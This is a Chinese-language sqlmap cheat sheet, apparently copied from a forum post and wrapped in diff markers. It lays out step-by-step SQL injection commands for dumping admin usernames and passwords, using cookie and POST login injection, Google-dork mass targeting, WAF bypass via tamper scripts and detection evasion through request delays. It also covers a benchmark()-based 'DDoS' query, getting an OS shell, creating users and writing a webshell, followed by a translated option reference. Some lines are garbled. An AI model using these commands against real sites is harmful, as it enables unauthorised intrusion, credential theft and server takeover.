@@ -1,0 +1,533 @@
+一、SQLMAP用于Access数据库注入
+
+(1) 猜解是否能注入
+[AppleScript] 纯文本查看 复制代码
+
+win: python sqlmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7"
+Linux : .lmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7"
+
+
+(2) 猜解表
+[AppleScript] 纯文本查看 复制代码
+
+win: python sqlmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --tables
+Linux: .lmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --tables
+
+
+(3) 根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)
+[AppleScript] 纯文本查看 复制代码
+
+win: python sqlmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --columns -T admin
+Linux: .lmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --columns -T admin
+
+(4) 根据字段猜解内容(假如通过3得到字段为username和password)
+[AppleScript] 纯文本查看 复制代码
+
+win: python sqlmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --dump -T admin -C "username,password"
+Linux: .lmap.py -u "http://www.xxx.com/en/CompHonorBig.asp?id=7" --dump -T admin -C
+"username,[url=]B[/url]password" 
+
+
+
+
+
+二、SQLMAP用于Cookie注入
+
+(1) cookie注入，猜解表
+[AppleScript] 纯文本查看 复制代码
+
+win : python sqlmap.py -u "http://www.xxx.org/jsj/shownews.asp" --cookie "id=31" --table --level 2
+
+(2) 猜解字段，(通过1的表猜解字段，假如表为admin)
+[AppleScript] 纯文本查看 复制代码
+
+win :python sqlmap.py -u "http://www.xxx.org/jsj/shownews.asp" --cookie "id=31" --columns -T
+admin --level 2
+
+(3) 猜解内容
+[AppleScript] 纯文本查看 复制代码
+
+win :python sqlmap.py -u "http://www.xxx.org/jsj/shownews.asp" --cookie "id=31" --dump -T
+admin -C "username,password" --level 2
+
+
+
+
+三、SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell
+[AppleScript] 纯文本查看 复制代码
+
+win:
+python sqlmap.py -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell
+Linux:
+sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --sql-shell
+
+(2) 输入执行语句完成DDOS攻击
+[AppleScript] 纯文本查看 复制代码
+
+select benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)
+
+
+
+
+
+四、SQLMAP用于mysql注入
+
+(1) 查找数据库
+[AppleScript] 纯文本查看 复制代码
+
+python sqlmap.py -u "http://www.xxx.com/link.php?id=321" --dbs
+
+(2) 通过第一步的数据库查找表(假如数据库名为dataname)
+[AppleScript] 纯文本查看 复制代码
+
+python sqlmap.py -u "http://www.xxx.com/link.php?id=321" -D dataname --tables
+
+(3) 通过2中的表得出列名(假如表为table_name)
+[AppleScript] 纯文本查看 复制代码
+
+python sqlmap.py -u "http://www.xxx.com/link.php?id=321" -D dataname -T table_name --columns 
+
+(4) 获取字段的值(假如扫描出id,user,password字段)
+[AppleScript] 纯文本查看 复制代码
+
+python sqlmap.py -u "http://www.xxx.com/link.php?id=321" -D dataname -T table_name -C
+"id,user,password" --dump
+
+
+
+
+
+
+五、SQLMAP中post登陆框注入
+
+(1) 其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件
+
+    我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。
+    这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。
+
+1. 浏览器打开目标地址http:// www.xxx.com /Login.asp
+2. 配置burp代理(127.0.0.1:8080)以拦截请求
+3. 点击login表单的submit按钮
+4. 这时候Burp会拦截到了我们的登录POST请求
+5. 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下
+6. 运行sqlmap并使用如下命令：
+
+./sqlmap.py -r search-test.txt -p tfUPass
+这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。
+
+注入点：http://testasp.vulnweb.com/Login.asp
+几种注入方式：./sqlmap.py -r search-test.txt -p tfUPass
+
+(2) 自动的搜索
+sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --forms
+
+
+(3) 指定参数搜索
+sqlmap -u [url]http://testasp.vulnweb.com/Login.asp[/url] --data "tfUName=321&tfUPass=321"
+
+
+
+
+六、SQLMAP中Google搜索注入
+
+
+inurl后面的语言是由自己定的
+
+注入过程中如果选y是注入，如果不是选n
+
+[AppleScript] 纯文本查看 复制代码
+
+sqlmap -g inurl:php?id=
+
+
+
+
+七、SQLMAP中的请求延迟
+
+参数 --delay --safe-freq
+
+[AppleScript] 纯文本查看 复制代码
+
+python sqlmap.py --dbs -u "http://xxx.cn/index.php/Index/view/id/40.html" --delay 1
+python sqlmap.py --dbs -u "http://xxx.cn/index.php/Index/view/id/40.html" --safe-freq 3
+
+
+
+
+八、SQLMAP绕过WAF防火墙
+
+注入点:http://192.168.159.1/news.php?id=1
+
+sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] -v 3 --dbs --batch --tamper "space2morehash.py"
+
+space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py
+
+都是编码方式
+
+space2hash.py base64encode.py charencode.py
+
+
+
+九、SQLMAP查看权限
+
+
+[AppleScript] 纯文本查看 复制代码
+
+sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --privileges
+
+
+
+十、SQLMAP伪静态注入(1) 查找数据库
+
+[AppleScript] 纯文本查看 复制代码
+
+python sqlmap.py -u "http://xxx.cn/index.php/Index/view/id/40.html" --dbs
+
+
+
+(2) 通过1中的数据库查找对应的表 (假如通过1，得到的是dataname)
+
+[AppleScript] 纯文本查看 复制代码
+
+python sqlmap.py -u "http://xxx.cn/index.php/Index/view/id/40.html" -D dataname --tables
+
+
+(3) 通过2中的数据表得到字段(假如得到的是tablename表)
+
+[AppleScript] 纯文本查看 复制代码
+
+python sqlmap.py -u "http://xxx.cn/index.php/Index/view/id/40.html" -D dataname -T
+tablename --columns
+
+
+(4) 通过3得到字段值(假如从3中得到字段id，password)
+
+[AppleScript] 纯文本查看 复制代码
+
+python sqlmap.py -u "http://xxx.cn/index.php/Index/view/id/40.html" -D dataname -T
+tablename -C "password" --dump
+
+
+十一、SQLMAP注入点执行命令与交互写shell
+
+
+(1) 注入点：http://192.168.159.1/news.php?id=1
+
+
+此处采用的是Linux系统
+
+[AppleScript] 纯文本查看 复制代码
+
+sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-cmd=ipconfig
+
+出现语言的选择根据实际的测试网站选择语言
+
+指定目标站点D:/www/
+
+
+(2) 获取Shell
+
+[AppleScript] 纯文本查看 复制代码
+
+sqlmap -u [url]http://192.168.159.1/news.php?id=1[/url] --os-shell
+
+
+出现语言的选择根据实际的测试网站选择语言
+
+
+指定目标站点D:/www/
+
+输入ipconfig/all
+
+创建用户和删除用户
+
+只要权限足够大，你可以输入使用任何命令。
+
+其他命令参考下面：
+
+
+从数据库中搜索字段
+
+[AppleScript] 纯文本查看 复制代码
+
+sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password
+
+
+在dedecms数据库中搜索字段admin或者password。
+
+
+
+读取与写入文件
+
+首先找需要网站的物理路径，其次需要有可写或可读权限。
+
+
+–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）
+
+–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）
+
+–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
+
+
+#示例：
+
+[AppleScript] 纯文本查看 复制代码
+
+sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”
+
+
+使用shell命令：
+
+[AppleScript] 纯文本查看 复制代码
+
+sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell
+
+
+接下来指定网站可写目录：
+
+
+“E:\php\htdocs\dvwa”
+
+#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）
+
+
+
+
+sqlmap详细命令：
+
+    -is-dba 当前用户权限（是否为root权限）
+
+    -dbs 所有数据库
+
+    -current-db 网站当前数据库
+
+    -users 所有数据库用户
+
+    -current-user 当前数据库用户
+
+    -random-agent 构造随机user-agent
+
+    -passwords 数据库密码
+
+    -proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理
+
+    -time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+
+
+Options（选项）：
+
+    -version 显示程序的版本号并退出
+    -h, –help 显示此帮助消息并退出
+    -v VERBOSE 详细级别：0-6（默认为1）
+
+
+Target（目标）：
+
+以下至少需要设置其中一个选项，设置目标URL。
+
+
+    -d DIRECT 直接连接到数据库。
+    -u URL, –url=URL 目标URL。
+    -l LIST 从Burp或WebScarab代理的日志中解析目标。
+    -r REQUESTFILE 从一个文件中载入HTTP请求。
+    -g GOOGLEDORK 处理Google dork的结果作为目标URL。
+    -c CONFIGFILE 从INI配置文件中加载选项。
+
+
+
+
+Request（请求）：
+
+这些选项可以用来指定如何连接到目标URL。
+
+
+    -data=DATA 通过POST发送的数据字符串
+    -cookie=COOKIE HTTP Cookie头
+    -cookie-urlencode URL 编码生成的cookie注入
+    -drop-set-cookie 忽略响应的Set – Cookie头信息
+    -user-agent=AGENT 指定 HTTP User – Agent头
+    -random-agent 使用随机选定的HTTP User – Agent头
+    -referer=REFERER 指定 HTTP Referer头
+    -headers=HEADERS 换行分开，加入其他的HTTP头
+    -auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
+    -auth-cred=ACRED HTTP身份验证凭据（用户名:密码）
+    -auth-cert=ACERT HTTP认证证书（key_file，cert_file）
+    -proxy=PROXY 使用HTTP代理连接到目标URL
+    -proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）
+    -ignore-proxy 忽略系统默认的HTTP代理
+    -delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
+    -timeout=TIMEOUT 等待连接超时的时间（默认为30秒）
+    -retries=RETRIES 连接超时后重新连接的时间（默认3）
+    -scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式
+    -safe-url=SAFURL 在测试过程中经常访问的url地址
+    -safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL
+
+
+
+
+Enumeration（枚举）：
+
+这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。
+
+    -b, –banner 检索数据库管理系统的标识
+    -current-user 检索数据库管理系统当前用户
+    -current-db 检索数据库管理系统当前数据库
+    -is-dba 检测DBMS当前用户是否DBA
+    -users 枚举数据库管理系统用户
+    -passwords 枚举数据库管理系统用户密码哈希
+    -privileges 枚举数据库管理系统用户的权限
+    -roles 枚举数据库管理系统用户的角色
+    -dbs 枚举数据库管理系统数据库
+    -D DBname 要进行枚举的指定数据库名
+    -T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）
+    -tables 枚举的DBMS数据库中的表
+    -columns 枚举DBMS数据库表列
+    -dump 转储数据库管理系统的数据库中的表项
+    -dump-all 转储所有的DBMS数据库表中的条目
+    -search 搜索列（S），表（S）和/或数据库名称（S）
+    -C COL 要进行枚举的数据库列
+    -U USER 用来进行枚举的数据库用户
+    -exclude-sysdbs 枚举表时排除系统数据库
+    -start=LIMITSTART 第一个查询输出进入检索
+    -stop=LIMITSTOP 最后查询的输出进入检索
+    -first=FIRSTCHAR 第一个查询输出字的字符检索
+    -last=LASTCHAR 最后查询的输出字字符检索
+    -sql-query=QUERY 要执行的SQL语句
+    -sql-shell 提示交互式SQL的shell
+
+
+
+
+
+Optimization（优化）：
+
+这些选项可用于优化SqlMap的性能。
+
+
+    -o 开启所有优化开关
+    –predict-output 预测常见的查询输出
+    –keep-alive 使用持久的HTTP（S）连接
+    –null-connection 从没有实际的HTTP响应体中检索页面长度
+    –threads=THREADS 最大的HTTP（S）请求并发量（默认为1）
+
+
+Injection（注入）：
+
+这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。
+
+
+    -p TESTPARAMETER 可测试的参数（S）
+    –dbms=DBMS 强制后端的DBMS为此值
+    –os=OS 强制后端的DBMS操作系统为这个值
+    –prefix=PREFIX 注入payload字符串前缀
+    –suffix=SUFFIX 注入payload字符串后缀
+    –tamper=TAMPER 使用给定的脚本（S）篡改注入数据
+
+
+Detection（检测）：
+
+这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
+
+    –level=LEVEL 执行测试的等级（1-5，默认为1）
+    –risk=RISK 执行测试的风险（0-3，默认为1）
+    –string=STRING 查询时有效时在页面匹配字符串
+    –regexp=REGEXP 查询时有效时在页面匹配正则表达式
+    –text-only 仅基于在文本内容比较网页
+
+
+Techniques（技巧）：
+
+这些选项可用于调整具体的SQL注入测试。
+
+    –technique=TECH SQL注入技术测试（默认BEUST）
+    –time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+    –union-cols=UCOLS 定列范围用于测试UNION查询注入
+    –union-char=UCHAR 用于暴力猜解列数的字符
+
+
+Fingerprint（指纹）：
+
+    -f, –fingerprint 执行检查广泛的DBMS版本指纹
+
+
+Brute force（蛮力）：
+
+这些选项可以被用来运行蛮力检查。
+
+    –common-tables 检查存在共同表
+
+    –common-columns 检查存在共同列
+
+
+User-defined function injection（用户自定义函数注入）：
+
+
+这些选项可以用来创建用户自定义函数。
+
+–udf-inject 注入用户自定义函数
+
+–shared-lib=SHLIB 共享库的本地路径
+
+
+
+File system access（访问文件系统）：
+
+这些选项可以被用来访问后端数据库管理系统的底层文件系统。
+
+
+    –file-read=RFILE 从后端的数据库管理系统文件系统读取文件
+    –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
+    –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
+
+
+
+Operating system access（操作系统访问）：
+
+这些选项可以用于访问后端数据库管理系统的底层操作系统。
+
+
+    –os-cmd=OSCMD 执行操作系统命令
+    –os-shell 交互式的操作系统的shell
+    –os-pwn 获取一个OOB shell，meterpreter或VNC
+    –os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
+    –os-bof 存储过程缓冲区溢出利用
+    –priv-esc 数据库进程用户权限提升
+    –msf-path=MSFPATH Metasploit Framework本地的安装路径
+    –tmp-path=TMPPATH 远程临时文件目录的绝对路径
+
+
+Windows注册表访问：
+
+这些选项可以被用来访问后端数据库管理系统Windows注册表。
+
+
+    –reg-read 读一个Windows注册表项值
+    –reg-add 写一个Windows注册表项值数据
+    –reg-del 删除Windows注册表键值
+    –reg-key=REGKEY Windows注册表键
+    –reg-value=REGVAL Windows注册表项值
+    –reg-data=REGDATA Windows注册表键值数据
+    –reg-type=REGTYPE Windows注册表项值类型
+    这些选项可以用来设置一些一般的工作参数。
+    -t TRAFFICFILE 记录所有HTTP流量到一个文本文件中
+    -s SESSIONFILE 保存和恢复检索会话文件的所有数据
+    –flush-session 刷新当前目标的会话文件
+    –fresh-queries 忽略在会话文件中存储的查询结果
+    –eta 显示每个输出的预计到达时间
+    –update 更新SqlMap
+    –save file保存选项到INI配置文件
+    –batch 从不询问用户输入，使用所有默认配置。
+
+
+Miscellaneous（杂项）：
+
+    –beep 发现SQL注入时提醒
+    –check-payload IDS对注入payloads的检测测试
+    –cleanup SqlMap具体的UDF和表清理DBMS
+    –forms 对目标URL的解析和测试形式
+    –gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
+    –page-rank Google dork结果显示网页排名（PR）
+    –parse-errors 从响应页面解析数据库管理系统的错误消息
+    –replicate 复制转储的数据到一个sqlite3数据库
+    –tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址
+    –wizard 给初级用户的简单向导界面
